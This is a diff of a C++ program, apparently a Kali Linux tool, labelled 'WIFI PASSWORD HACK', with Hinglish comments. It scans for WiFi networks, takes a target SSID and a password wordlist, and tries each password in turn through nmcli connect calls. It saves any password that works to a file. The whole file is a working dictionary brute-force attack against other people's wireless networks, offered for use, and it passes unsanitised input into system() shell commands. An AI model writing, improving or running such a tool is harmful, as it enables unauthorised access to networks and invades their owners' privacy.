@@ -15,27 +15,45 @@ using namespace std;
 
 int main() {
     cout << CYAN << BOLD << "===========================================" << endl;
-    cout << "        RONNIE WIFI PRO (KALI LINUX)       " << endl;
+    cout << "        RONNIE HACKER WIFI PASSWORD  HACK      " << endl;
     cout << "===========================================" << RESET << endl;
 
+    wireless_scan_head head;
+    wireless_scan *result;
+    iwrange range;
+    int sock;
     string card;
-    cout << "ENTER_INTERFACE (e.g., wlan0): ";
+
+    cout << "SELECT_WIFI_INTERFACE (e.g. wlan0): ";
     getline(cin, card);
 
-    // वाई-फाई स्कैनिंग (Kali Linux के लिए nmcli सबसे बेस्ट है)
-    cout << YELLOW << "[*] Scanning for Networks..." << RESET << endl;
-    system("nmcli dev wifi list");
+    const char *interface = card.c_str(); 
+    sock = iw_sockets_open();
+
+    if (sock < 0 || iw_get_range_info(sock, interface, &range) < 0) {
+        cerr << RED << "Error: Interface setup fail!" << RESET << endl;
+        return 1;
+    }
+
+    if (iw_scan(sock, (char *)interface, range.we_version_compiled, &head) < 0) {
+        cerr << RED << "Scan fail! Sudo check karein." << RESET << endl;
+        return 1;
+    }
+
+    cout << YELLOW << "\n--- Available WiFi Networks ---" << RESET << endl;
+    result = head.result;
+    while (result != NULL) {
+        cout << "SSID: " << (result->b.has_essid ? result->b.essid : "Hidden") << endl;
+        result = result->next;
+    }
 
     string target_ssid, wordlist_path;
-    cout << CYAN << "\nTarget SSID: " << RESET; 
-    getline(cin >> ws, target_ssid);
-
-    cout << CYAN << "Wordlist Path (e.g., /usr/share/wordlists/rockyou.txt): " << RESET;
-    getline(cin >> ws, wordlist_path);
+    cout << CYAN << "\nTarget SSID_WIFI_NAME: " << RESET; getline(cin >> ws, target_ssid);
+    cout << CYAN << "Wordlist Path: " << RESET; getline(cin >> ws, wordlist_path);
 
     ifstream file(wordlist_path);
     if (!file.is_open()) {
-        cerr << RED << "Error: Wordlist file nahi mili! Path check karein." << RESET << endl;
+        cerr << RED << "Wordlist file nahi mili!" << RESET << endl;
         return 1;
     }
 
@@ -43,53 +61,55 @@ int main() {
     bool success = false;
     int line_number = 0;
 
-    cout << YELLOW << "\n[!] Starting Attack on: " << target_ssid << RESET << endl;
+    cout << YELLOW << "\n[!] Attack Start... Stable connection mode enabled." << RESET << endl;
 
     while (getline(file, current_password)) {
         line_number++;
-        
-        // पासवर्ड क्लीनिंग (हटाना \r या \n)
+
         if (!current_password.empty() && (current_password.back() == '\r' || current_password.back() == '\n')) {
             current_password.pop_back();
         }
 
-        if (current_password.length() < 8) continue; // WPA2 minimum 8 chars
+        if (current_password.length() < 8) continue;
 
-        cout << "[LINE " << line_number << "] TRYING: " << current_password << flush;
+        cout <<RED<<line_number << current_password.length() << "] "
+             << "TRYING: " << current_password << flush;
 
-        // पुराने कनेक्शन प्रोफाइल को डिलीट करना ताकि फ्रेश अटेम्प्ट हो सके
-        string del_cmd = "nmcli connection delete id \"" + target_ssid + "\" > /dev/null 2>&1";
-        system(del_cmd.c_str());
+        // पुराने प्रोफाइल हटाना ज़रूरी है ताकि नया पासवर्ड रजिस्टर हो सके
+        system(("nmcli connection delete id \"" + target_ssid + "\" > /dev/null 2>&1").c_str());
 
-        // nmcli के ज़रिए कनेक्ट करने का प्रयास
-        string command = "nmcli dev wifi connect \"" + target_ssid + "\" password \"" + current_password + "\" > /dev/null 2>&1";
+        // 'nmcli' connect command - बिना '--wait' के कभी-कभी गलत रिस्पॉन्स आता है
+        string command = "nmcli dev wifi connect \"" + target_ssid + 
+                         "\" password \"" + current_password + "\" > /dev/null 2>&1";
         
         int ret = system(command.c_str());
 
         if (ret == 0) {
             cout << GREEN << " -> [SUCCESS!]" << RESET << endl;
-            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << current_password << RESET << endl;
-            
-            // फाइल में सेव करें
-            ofstream saveFile("found_pass.txt", ios::app);
+            cout << GREEN << BOLD << "\n[+] Sahi Password Mil Gaya: " << current_password << RESET << endl;
+            cout << GREEN << "[+] Wifi " << target_ssid << " se connect ho gaya hai!" << RESET << endl;
+
+            // पासवर्ड सेव करें
+            ofstream saveFile("found_password.txt", ios::app);
             if (saveFile.is_open()) {
                 saveFile << "SSID: " << target_ssid << " | Password: " << current_password << endl;
                 saveFile.close();
-                cout << CYAN << "[*] Password 'found_pass.txt' me save kar diya gaya hai." << RESET << endl;
             }
-            
+
             success = true;
-            break; // सही पासवर्ड मिलते ही रुकें
+            break; 
         } else {
             cout << RED << " -> [FAILED]" << RESET << endl;
         }
         
-        // नेटवर्क कार्ड को रिसेट होने का समय दें (थोड़ा तेज़ किया गया है)
-        usleep(300000); 
+        // अगले पासवर्ड से पहले कार्ड को थोड़ा समय दें
+        //usleep(10);
+       // usleep(500000); 
     }
 
     if (!success) cout << RED << "\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;
 
     file.close();
+    iw_sockets_close(sock);
     return 0;
 }
